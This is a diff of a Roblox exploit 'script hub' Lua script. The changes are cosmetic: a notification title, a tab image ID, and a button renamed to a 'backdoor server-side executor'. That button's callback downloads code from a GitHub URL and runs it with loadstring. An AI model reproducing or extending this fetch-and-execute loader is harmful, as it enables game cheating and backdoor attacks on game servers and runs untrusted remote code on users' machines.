@@ -1,4 +1,5 @@
-game:GetService("StarterGui"):SetCore("SendNotification",{  Title = "c00lhackk script hub says",      
+
+ 🤑game:GetService("StarterGui"):SetCore("SendNotification",{  Title = "c00lhackk script hub says",      
 Text = "by @Roblox_exploit-help",
 })
 
@@ -62,7 +63,7 @@ local Window = Rayfield:CreateWindow({
 
 })
 
-local TabRip = Window:CreateTab("@Rip_game9819 roblox scripts", 130695581754590) -- Title, Image
+local TabRip = Window:CreateTab("@Rip_game9819 roblox scripts", 6579106223) -- Title, Image
 
 local TabExploit = Window:CreateTab("@Roblox_exploit-help roblox scripts", 89741975353847) -- Title, Image
 
@@ -146,7 +147,7 @@ local Button = TabExploit:CreateButton({
 
 local Button = TabExploit:CreateButton({
 
-   Name = "c00lhackk ss executor",
+   Name = "c00lhackkbackdoor server-side executor",
 
    Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Shadowhacksaw/Hi/refs/heads/main/c00lhackkbackdoor.scanner"))()
 
